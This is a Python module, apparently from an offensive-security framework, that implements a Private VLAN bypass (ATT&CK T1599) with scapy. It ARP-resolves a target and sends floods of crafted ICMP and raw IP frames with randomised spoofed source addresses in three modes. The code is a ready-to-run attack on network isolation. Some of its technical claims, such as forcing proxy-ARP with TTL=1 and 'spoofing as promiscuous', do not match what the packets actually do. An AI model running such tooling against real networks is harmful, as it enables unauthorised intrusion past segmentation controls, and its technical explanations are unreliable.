"""
Private VLAN (PVLAN) Bypass — T1599

Three PVLAN bypass techniques:
  isolated    — send from isolated port to another via proxy-ARP through uplink
  community   — communicate within a community VLAN to reach other members
  promiscuous — spoof as promiscuous port to reach isolated hosts

By default, isolated ports cannot communicate; this module exploits
edge cases and misconfigurations to bypass that restriction.
"""
import random

from scapy.all import ICMP, IP, Ether, sendp

NAME = "pvlan"
DESCRIPTION = "Private VLAN bypass — 3 techniques: isolated, community, promiscuous"
ATTCK_ID = "T1599"


# ── Framework interface ────────────────────────────────────────────────────────

def register(subparsers, add_engagement_args):
    p = subparsers.add_parser(
        NAME,
        help=f"{DESCRIPTION} ({ATTCK_ID})",
        description=__doc__,
    )
    _add_args(p)
    add_engagement_args(p)
    p.set_defaults(func=run)


def run(args, logger):
    logger.info("START | technique=%s | iface=%s | mode=%s | target=%s | count=%d",
                ATTCK_ID, args.interface, args.mode, args.target_ip, args.count)
    ok = _execute(args, logger)
    logger.info("END | success=%s", ok)
    return 0 if ok else 1


# ── Argument definition ────────────────────────────────────────────────────────

def _add_args(p):
    p.add_argument("--interface", "-i", required=True)
    p.add_argument("--target-ip", "-ti", required=True)
    p.add_argument("--mode",
                   choices=["isolated", "community", "promiscuous"],
                   default="isolated")
    p.add_argument("--count", "-c", type=int, default=100)
    p.add_argument("--verbose", "-v", action="store_true")


# ── Core logic ────────────────────────────────────────────────────────────────

def _execute(args, logger=None):
    _log = logger.info if logger else print

    target_mac = _resolve_mac(args.target_ip, args.interface)
    if not target_mac:
        _log("[-] Could not resolve target MAC address")
        return False

    _log(f"[PVLAN] Target={args.target_ip} ({target_mac}) | mode={args.mode}")

    dispatch = {
        "promiscuous": _promiscuous_attack,
        "community":   _community_attack,
        "isolated":    _isolated_attack,
    }
    return dispatch[args.mode](args.interface, args.target_ip, target_mac, args.count, _log)


def _resolve_mac(ip, iface):
    from scapy.all import ARP, Ether, srp
    answered = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                   timeout=2, verbose=False, iface=iface)[0]
    return answered[0][1].hwsrc if answered else None


def _promiscuous_attack(iface, target_ip, target_mac, count, _log):
    """Send from a spoofed promiscuous port to reach an isolated host."""
    pkts = [
        Ether(dst=target_mac) /
        IP(dst=target_ip, src=f"192.168.{random.randint(1,254)}.{random.randint(1,254)}") /
        ICMP() / b"PVLAN_PROMISCUOUS"
        for _ in range(count)
    ]
    sendp(pkts, iface=iface, verbose=False)
    _log(f"[PVLAN] Promiscuous — sent {count} packets")
    return True


def _community_attack(iface, target_ip, target_mac, count, _log):
    """Communicate within a community VLAN to reach other members."""
    pkts = [
        Ether(dst=target_mac) /
        IP(dst=target_ip, src=f"10.0.{random.randint(1,254)}.{random.randint(1,254)}") /
        ICMP() / b"PVLAN_COMMUNITY"
        for _ in range(count)
    ]
    sendp(pkts, iface=iface, verbose=False)
    _log(f"[PVLAN] Community — sent {count} packets")
    return True


def _isolated_attack(iface, target_ip, target_mac, count, _log):
    """Send from an isolated port via proxy-ARP through the promiscuous uplink."""
    pkts = []
    for _ in range(count):
        # TTL=1 forces router to handle forwarding via proxy-ARP (isolated port technique)
        technique = random.choice([
            Ether(dst=target_mac) / IP(dst=target_ip) / ICMP() / b"PVLAN_ISO_1",
            Ether(dst=target_mac) / IP(dst=target_ip, ttl=1) / ICMP() / b"PVLAN_ISO_2",
            Ether(dst=target_mac) / IP(dst=target_ip, proto=255) / b"PVLAN_ISO_3",
        ])
        pkts.append(technique)
    sendp(pkts, iface=iface, verbose=False)
    _log(f"[PVLAN] Isolated — sent {count} packets")
    return True
